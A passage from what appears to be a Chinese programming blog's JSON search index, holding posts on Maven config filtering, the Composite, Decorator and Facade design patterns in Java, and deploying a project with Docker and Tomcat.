class=\"name\">directory</span>&gt;</span>src/main/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>打包的时候替换指定参数</p>\n<p>修改applicationContext-config.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.feiniu.config.PropertyPlaceholderConfigurerEx&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;locations&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>$&#123;config.path&#125;/*.properties<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>测试打包是否正常</p>\n","categories":["基础知识"],"tags":["Spring","SpringMVC","Mybatis","基础"]},{"title":"Java设计模式-组合模式（Composite Pattern）","url":"/2017/10/10/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F%EF%BC%88Composite-Pattern%EF%BC%89/","content":"<h3 id=\"树形结构的处理–组合模式\"><a href=\"#树形结构的处理–组合模式\" class=\"headerlink\" title=\"树形结构的处理–组合模式\"></a>树形结构的处理–组合模式</h3><blockquote>\n<p>组合多个对象形成树形结构以表示具有“整体—部分”关系的层次结构。组合模式对单个对象（即叶子对象）和组合对象（即容器对象）的使用具有一致性，组合模式又可以称为“整体—部分”(Part-Whole)模式，它是一种对象结构型模式。</p>\n</blockquote>\n<p>组合模式中，使得客户端看来单个对象和对象的组合是同等的。换句话说，某个类型的方法同时也接受自身类型作为参数。</p>\n<p>组合模式UML如图所示：<br><img src=\"/images/old/20171010%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-10%E4%B8%8B%E5%8D%889.54.17.png\"></p>\n<span id=\"more\"></span>\n<p>在组合模式中，通常有：</p>\n<ul>\n<li>抽象构件（Component）：它可以是接口或抽象类，为叶子构件和容器构件对象声明接口，在该角色中可以包含所有子类共有行为的声明和实现。在抽象构件中定义了访问及管理它的子构件的方法，如增加子构件、删除子构件、获取子构件等。</li>\n<li>叶子构件（Leaf）：它在组合结构中表示叶子节点对象，叶子节点没有子节点，它实现了在抽象构件中定义的行为。对于那些访问及管理子构件的方法，可以通过异常等方式进行处理。</li>\n<li>容器构件（Composite）：它在组合结构中表示容器节点对象，容器节点包含子节点，其子节点可以是叶子节点，也可以是容器节点，它提供一个集合用于存储子节点，实现了在抽象构件中定义的行为，包括那些访问及管理子构件的方法，在其业务方法中可以递归调用其子节点的业务方法。</li>\n</ul>\n<p>在组合模式中关键是抽象构件，既可以代表叶子也可以代表容器。还可以通过抽象构件进行统一操作。同时容器对象与抽象构件还是聚合关系，容器中既包含叶子也可以包含容器。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象构件</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractComponent</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构件操作</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 添加构件</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> component</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(AbstractComponent component)</span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 删除构件</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> component</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">remove</span><span class=\"params\">(AbstractComponent component)</span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 叶子构件</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Leaf</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractComponent</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;叶子节点操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(AbstractComponent component)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsupportedOperationException</span>(<span class=\"string\">&quot;不支持操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">remove</span><span class=\"params\">(AbstractComponent component)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsupportedOperationException</span>(<span class=\"string\">&quot;不支持操作&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 容器构件</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Composite</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractComponent</span> &#123;</span><br><span class=\"line\">    List&lt;AbstractComponent&gt; componentList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        componentList.forEach(AbstractComponent::operation);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(AbstractComponent component)</span> &#123;</span><br><span class=\"line\">        componentList.add(component);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">remove</span><span class=\"params\">(AbstractComponent component)</span> &#123;</span><br><span class=\"line\">        componentList.remove(component);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> AbstractComponent <span class=\"title function_\">getChild</span><span class=\"params\">(<span class=\"type\">int</span> i)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> componentList.get(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在示例代码中叶子构件中调用add、remove方法会抛出异常，不支持相关方法，在容器构件中有相关方法的实现。</p>\n<h3 id=\"透明组合模式和安全组合模式\"><a href=\"#透明组合模式和安全组合模式\" class=\"headerlink\" title=\"透明组合模式和安全组合模式\"></a>透明组合模式和安全组合模式</h3><p>如上实例代码中使用的是透明组合模式，由抽象类统一默认实现相关方法，这样有个确定是在子也构件使用相关方法的时候，会报错。如果不希望出现错误信息，可以是用安全组合模式。即抽象类删除掉不相干的方法只留一个operation，子叶构件直接实现不用而外添加相关方法。容器构件自己新增所需要的方法。这样有个缺点是，在使用的时候，必须指定子类。</p>\n<h3 id=\"JDK中组合模式使用\"><a href=\"#JDK中组合模式使用\" class=\"headerlink\" title=\"JDK中组合模式使用\"></a>JDK中组合模式使用</h3><p>在画图组件java.awt包中如：</p>\n<ul>\n<li>Component：抽象构件</li>\n<li>Container：容器</li>\n<li>Checkbox、Label、Button等叶子构件</li>\n</ul>\n<p>Component如图：<br><img src=\"/images/old/20171010%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-10%E4%B8%8B%E5%8D%889.31.21.png\"></p>\n<p>Container如图：<br><img src=\"/images/old/20171010%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-10%E4%B8%8B%E5%8D%889.32.06.png\"></p>\n<p>该出使用的是安全组合模式。</p>\n<h3 id=\"组合模式总结\"><a href=\"#组合模式总结\" class=\"headerlink\" title=\"组合模式总结\"></a>组合模式总结</h3><p>组合模式还可以用在该处<br><img src=\"/images/old/20171010%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-10%E4%B8%8B%E5%8D%889.45.34.png\"><br>公司组织结构队员的树形菜单。行政人员在下发通知的时候，可以直接下发到部门，也可以下发到子公司。</p>\n<p>组合模式使用面向对象的思想来实现树形结构的构建与处理，描述了如何将容器对象和叶子对象进行递归组合，实现简单，灵活性好。由于在软件开发中存在大量的树形结构，因此组合模式是一种使用频率较高的结构型设计模式。</p>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>在具有整体和部分的层次结构中，希望通过一种方式忽略整体与部分的差异</li>\n<li>在一个使用面向对象语言开发的系统中需要处理一个树形结构。</li>\n<li>在一个系统中能够分离出叶子对象和容器对象，而且它们的类型不固定，需要增加一些新的类型。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>组合模式可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次。</li>\n<li>可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了部分代码。</li>\n<li>在组合模式中增加新的容器构件和叶子构件都很方便，无须对现有类库进行任何修改，符合“开闭原则”。</li>\n<li>组合模式为树形结构的面向对象实现提供了一种灵活的解决方案，通过叶子对象和容器对象的递归组合，可以形成复杂的树形结构，但对树形结构的控制却非常简单。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>使用组合模式后，控制树枝构件的类型不太容易。比如需要某个容器组件全部为某个指定类型，需要在外部控制。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","组合模式","Composite Pattern"]},{"title":"Docker Tomcat部署项目","url":"/2017/10/12/Docker-Tomcat%E9%83%A8%E7%BD%B2%E9%A1%B9%E7%9B%AE/","content":"<h3 id=\"下载配置相关软件\"><a href=\"#下载配置相关软件\" class=\"headerlink\" title=\"下载配置相关软件\"></a>下载配置相关软件</h3><p>配置自定义Docker镜像，镜像系统为了省事直接用CentOS，直接在使用命令下载：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker install centos</span><br></pre></td></tr></table></figure>\n<p>需要下载JRE和Tomcat，Jre在Oracle官网下载Jre8和Tomcat官网下载。</p>\n<p>Jre下载解压后不需要做相应改动。<br>Tomcat在解压后，删除 <strong><code>webroot/ROOT</code></strong> 下所有文件。修改 **<code>conf/server.xml</code>**，在Host节点下添加 ** <code>&amp;lt;Context docBase=&quot;/home/webdata/webroot/manage.war&quot; path=&quot;&quot; reloadable=&quot;true&quot; /&amp;gt;</code> ** 。<code>manage.war</code>表示这次配置的项目。<span id=\"more\"></span></p>\n<h3 id=\"配置Dockerfile\"><a href=\"#配置Dockerfile\" class=\"headerlink\" title=\"配置Dockerfile\"></a>配置Dockerfile</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 使用centos镜像</span><br><span class=\"line\">FROM centos</span><br><span class=\"line\">MAINTAINER whh &quot;xuzhuowhh@gmail.com&quot;</span><br><span class=\"line\"># 创建jre目录</span><br><span class=\"line\">RUN mkdir /usr/local/jre</span><br><span class=\"line\"># 创建tomcat目录</span><br><span class=\"line\">RUN mkdir /usr/local/tomcat</span><br><span class=\"line\"># 和之前tomcat中docBase中配置的目录保持一致</span><br><span class=\"line\">RUN mkdir -p /home/webdata/webroot</span><br><span class=\"line\"># 添加本地jre目录到自定义镜像目录</span><br><span class=\"line\">ADD jre1.8.0_144 /usr/local/jre</span><br><span class=\"line\"># 添加本地tomcat目录到自定义镜像目录</span><br><span class=\"line\">ADD apache-tomcat-9.0.1 /usr/local/tomcat/</span><br><span class=\"line\"># 配置环境变量</span><br><span class=\"line\">ENV JRE_HOME /usr/local/jre</span><br><span class=\"line\">ENV PATH $PATH:$JRE_HOME/bin</span><br><span class=\"line\"></span><br><span class=\"line\"># 暴露端口</span><br><span class=\"line\">EXPOSE 8080</span><br><span class=\"line\"># 镜像启动时启动tomcat</span><br><span class=\"line\">CMD [&quot;/usr/local/tomcat/bin/catalina.sh&quot;, &quot;run&quot;]</span><br></pre></td></tr></table></figure>\n\n<p>配置完成后，构建自定义镜像</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -t whhxz/manage .</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注：最后面有个点</li>\n</ul>\n<h3 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h3><p>启动项目：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -v /home/whh/Documents/docker/webroot/:/home/webdata/webroot -p 8080:8080 whhxz/manage</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-d：表示后台运行<br>-v：表示挂载本地目录到容器目录中<br>-p：表示映射本地端口和容器端口</p>\n</blockquote>\n<p>启动完成后可以直接访问项目地址。<br>在最开始配置的时候，会出现各种各样的问题，如果容器启动不起来，可以通过命令进入容器里面</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -i -t -v /home/whh/Documents/docker/webroot/:/home/webdata/webroot -p 8080:8080 whhxz/manage /bin/bash</span><br></pre></td></tr></table></figure>\n<p>启动容器后，使用docker ps查看运行的容器，获取<code>CONTAINER ID</code>，通过命令 <strong>docker attach <code>CONTAINER ID</code></strong> 进入容器，调试出现的问题，一步步改进配置。</p>\n<ul>\n<li>注：在使用<code>CONTAINER ID</code>的时候，只使用前四位也可以。</li>\n</ul>\n<h3 id=\"后续需要改进\"><a href=\"#后续需要改进\" class=\"headerlink\" title=\"后续需要改进\"></a>后续需要改进</h3><ul>\n<li>1、日志的收集以及查看</li>\n<li>2、在实际使用过程中，最好是通过自定义脚本启动tomcat，在脚本中，清理tomcat缓存，避免出现问题。</li>\n</ul>\n","categories":["Docker"],"tags":["Docker"]},{"title":"Java设计模式-装饰模式（Decorator Pattern）","url":"/2017/10/12/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E6%A8%A1%E5%BC%8F%EF%BC%88Decorator-Pattern%EF%BC%89/","content":"<h3 id=\"扩展系统功能–装饰模式\"><a href=\"#扩展系统功能–装饰模式\" class=\"headerlink\" title=\"扩展系统功能–装饰模式\"></a>扩展系统功能–装饰模式</h3><blockquote>\n<p>定义：动态地给一个对象增加一些额外的职责，就增加对象功能来说，装饰模式比生成子类实现更为灵活。装饰模式是一种对象结构型模式。</p>\n</blockquote>\n<p>装饰模式可以在不改变一个对象本身功能的基础上给对象增加额外的功能。装饰模式是一种替代继承的技术，它通过一种无须定义子类的方式来给对象动态增加职责，使用对象之间的关联关系取代类之间的继承关系。在装饰模式中引入了装饰类，在装饰类中既可以调用待装饰的原有类的方法，还可以增加新的方法，以扩充原有类的功能。</p>\n<p>举例：<br><img src=\"/images/old/20171012%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-12%E4%B8%8B%E5%8D%885.06.49.png\"><span id=\"more\"></span><br>在这个里面孙悟空只是一种动物，在使用了七十二变之后，就可以变为其他事物。这里<code>七十二变</code>就是装饰器，装饰后就可以做别的事情了。这里只是举例，便于理解，实际设计需要依据情况来。</p>\n<ul>\n<li>参考：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9qYXZhLW15LWxpZmUvYXJjaGl2ZS8yMDEyLzA0LzIwLzI0NTU3MjYuaHRtbA==\">装饰设计模式<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>在装饰模式中，实际UML图如下：<br><img src=\"/images/old/20171012%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-12%E4%B8%8B%E5%8D%885.17.56.png\"></p>\n<ul>\n<li>抽象构件（Component）：它是具体构件和抽象装饰类的共同父类，声明了在具体构件中实现的业务方法，它的引入可以使客户端以一致的方式处理未被装饰的对象以及装饰之后的对象，实现客户端的透明操作。</li>\n<li>具体构件（ConcreteComponent）：它是抽象构件类的子类，用于定义具体的构件对象，实现了在抽象构件中声明的方法，装饰器可以给它增加额外的职责（方法）。</li>\n<li>抽象装饰器（Decorator）：它也是抽象构件类的子类，用于给具体构件增加职责，但是具体职责在其子类中实现。它维护一个指向抽象构件对象的引用，通过该引用可以调用装饰之前构件对象的方法，并通过其子类扩展该方法，以达到装饰的目的。</li>\n<li>具体装饰器（ConcreteDecorator）：它是抽象装饰类的子类，负责向构件添加新的职责。每一个具体装饰类都定义了一些新的行为，它可以调用在抽象装饰类中定义的方法，并可以增加新的方法用以扩充对象的行为。</li>\n</ul>\n<p>这里省略具体示例，直接分析JDK中应用。</p>\n<h3 id=\"在JDK中使用\"><a href=\"#在JDK中使用\" class=\"headerlink\" title=\"在JDK中使用\"></a>在JDK中使用</h3><p>在IO中InputStream相关类中是典型的装饰模式。如图：<br><img src=\"/images/old/20171012%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-12%E4%B8%8B%E5%8D%886.05.34.png\"></p>\n<ul>\n<li>InputStream：抽象构件，为子类提供统一接口</li>\n<li>FileInputStream、ByteArrayInputStream：抽象构件子类，实现父类相关接口</li>\n<li>FilterInputStream：装饰器，用于增强InputStream</li>\n<li>BufferedInputStream、PushbackInputStream：装饰器子类，增强InputStream。<code>BufferedInputStream </code>的作用是为另一个输入流添加一些功能，例如，提供“缓冲功能”以及支持“mark()标记”和“reset()重置方法”。带缓冲的流一次读取多个字节，相比InputStream一次读取一个字节，带缓存的磁盘操作减少了磁盘的操作次数，加快了读取速度。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/Users/demo/Downloads/CentOS-7.0-1406-x86_64-DVD.iso&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\"><span class=\"comment\">//使用buffered读取</span></span><br><span class=\"line\"><span class=\"type\">BufferedInputStream</span> <span class=\"variable\">bufferedInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(fileName)));</span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\"><span class=\"keyword\">while</span> (bufferedInputStream.read(bytes)!= -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"variable\">end</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">System.out.println(end - start);</span><br><span class=\"line\">bufferedInputStream.close();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//使用fileInputStream读取</span></span><br><span class=\"line\">bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\"><span class=\"type\">FileInputStream</span> <span class=\"variable\">fileInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(fileName));</span><br><span class=\"line\"><span class=\"keyword\">while</span> (fileInputStream.read(bytes)!= -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">System.out.println(System.currentTimeMillis() - end);</span><br><span class=\"line\">fileInputStream.close();</span><br></pre></td></tr></table></figure>\n<p>这里通过种读取文件测试，buffer在1700左右，直接读取在4000左右，使用装饰器对文件读取增强。</p>\n<h3 id=\"装饰模式总结\"><a href=\"#装饰模式总结\" class=\"headerlink\" title=\"装饰模式总结\"></a>装饰模式总结</h3><p>装饰模式和适配器模式都可以视为“包装”模式，它们都是通过封装其他对象达到设计的目的的。</p>\n<p>理想的装饰模式在对被装饰对象进行功能增强的同时，要求具体构件角色、装饰角色的接口与抽象构件角色的接口完全一致。而适配器模式则不然，一般而言，适配器模式并不要求对源对象的功能进行增强，但是会改变源对象的接口，以便和目标接口相符合。</p>\n<p>装饰模式分为两种：透明装饰模式、半透明装饰模式</p>\n<ul>\n<li>透明的装饰模式也就是理想的装饰模式，要求具体构件角色、装饰角色的接口与抽象构件角色的接口完全一致</li>\n<li>如果装饰角色的接口与抽象构件角色接口不一致，也就是说装饰角色的接口比抽象构件角色的接口宽的话，装饰角色实际上已经成了一个适配器角色，这种装饰模式也是可以接受的，称为“半透明”的装饰模式</li>\n</ul>\n<p>透明装饰、半透明装饰、适配器可以理解为下图<br><img src=\"/images/old/20171012%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-12%E4%B8%8B%E5%8D%886.34.13.png\"></p>\n<ul>\n<li>注：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9qYXZhLW15LWxpZmUvYXJjaGl2ZS8yMDEyLzA0LzIwLzI0NTU3MjYuaHRtbA==\">http://www.cnblogs.com/java-my-life/archive/2012/04/20/2455726.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>在InputStream中，FilterInputStream方法和InputStream中一样，可以视为透明装饰，但是在子类中新增了方法，就属于半透明模式。<br>在IO中Reader同样使用了装饰模式。</p>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>在不影响其他类的情况下，以动态、透明的方式给单个对象添加职责。</li>\n<li>当不能采用继承的方式对系统进行扩展或者采用继承不利于系统扩展和维护时可以使用装饰模式。即系统中存在大量独立的扩展，为支持每一种扩展或者扩展之间的组合将产生大量的子类，使得子类数目呈爆炸性增长；或者类已定义为不能被继承（Final）。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>对于扩展一个对象的功能，装饰模式比继承更加灵活性</li>\n<li>可以通过一种动态的方式来扩展一个对象的功能，通过配置文件可以在运行时选择不同的具体装饰类，从而实现不同的行为。</li>\n<li>可以对一个对象进行多次装饰，通过使用不同的具体装饰类以及这些装饰类的排列组合，可以创造出很多不同行为的组合，得到功能更为强大的对象。</li>\n<li>具体构件类与具体装饰类可以独立变化，用户可以根据需要增加新的具体构件类和具体装饰类，原有类库代码无须改变，符合“开闭原则”。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>使用装饰模式进行系统设计时将产生很多小对象，大量的小对象在一定程度上会使用系统性能。</li>\n<li>对于多次装饰的对象，容易出错，出错不好排查。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","装饰模式","Decorator Pattern"]},{"title":"Java设计模式-外观模式（Facade Pattern）","url":"/2017/10/14/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F%EF%BC%88Facade-Pattern%EF%BC%89/","content":"<h3 id=\"实现对象的复用–外观模式\"><a href=\"#实现对象的复用–外观模式\" class=\"headerlink\" title=\"实现对象的复用–外观模式\"></a>实现对象的复用–外观模式</h3><blockquote>\n<p>定义：为子系统中的一组接口提供一个统一的入口。外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p>\n</blockquote>\n<p>外观模式又称为门面模式，它是一种对象结构型模式。外观模式是迪米特法则的一种具体实现，通过引入一个新的外观角色可以降低原有系统的复杂度，同时降低客户类与子系统的耦合度。</p>\n<p>举例：<br><img src=\"/images/old/20171014%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-14%E4%B8%8B%E5%8D%889.57.52.png\"><br>一般情况下，要学习某个知识，每个人都得去找资料，每个人都要去学习，这个过程就比较麻烦，如果这个时候找个中间人，由中间人去找资料，然后分享给大家，这样就方便多了。如图：<br><img src=\"/images/old/20171014%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-14%E4%B8%8B%E5%8D%889.56.45.png\"></p>\n<span id=\"more\"></span>\n<p>外观UML类图如下：<br><img src=\"/images/old/20171014%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-14%E4%B8%8B%E5%8D%8810.02.23.png\"></p>\n<ul>\n<li>客户端：调用方</li>\n<li>外观角色（Facade）：在客户端可以调用它的方法，在外观角色中可以知道相关的（一个或者多个）子系统的功能和责任；在正常情况下，它将所有从客户端发来的请求委派到相应的子系统去，传递给相应的子系统对象处理。</li>\n<li>子系统：每一个子系统可以不是一个单独的类，而是一个类的集合，它实现子系统的功能；每一个子系统都可以被客户端直接调用，或者被外观角色调用，它处理由外观类传过来的请求；子系统并不知道外观的存在，对于子系统而言，外观角色仅仅是另外一个客户端而已。</li>\n</ul>\n<p>因为外观模式非常简单，省略举例。</p>\n<h3 id=\"外观模式总结\"><a href=\"#外观模式总结\" class=\"headerlink\" title=\"外观模式总结\"></a>外观模式总结</h3><p>外观模式和工厂模式有点相似的地方，工厂模式中，客户端只用调用工厂，而不用管工厂内部实现，外观模式也是客户端只用调用外观角色，而不用管具体细节。</p>\n<p>外观模式在一定程度上降低了类与类之间的耦合，引入外观模式后，新增和修改子系统都非常方便，在实现开发过程中，外观模式使用非常频繁。</p>\n<p>在使用标准外观模式时，如果需要增加、删除或者更换与外观类交互的子系统，必须修改外观类或者客户端的源码，这违背了开闭原则。所以在使用外观模式时，可以引入抽象外观类，如图：<br><img src=\"/images/old/20171014%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-14%E4%B8%8B%E5%8D%8810.14.09.png\"></p>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>当涉及到与多个复杂系统频繁交互时，为了降低系统复杂程度，可以采用外观模式。</li>\n<li>当需要构件一个层次结构的子系统时，使用外观模式定义系统中每层的入口点。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>对客户端屏蔽了系统组件，减少了客户端的对象数目并使子系统使用起来更加容易，对象关联少了。</li>\n<li>子系统和客户端松耦合，使得子系统变化后，客户端不需要变动。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>不能很好限制客户端使用子系统</li>\n<li>新增子系统，可能需要修改外观类源码</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","外观模式","Facade Pattern"]},{"title":"Java设计模式-享元模式（Flyweight Pattern）","url":"/2017/10/17/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F%EF%BC%88Flyweight-Pattern%EF%BC%89/","content":"<h3 id=\"享元模式\"><a href=\"#享元模式\" class=\"headerlink\" 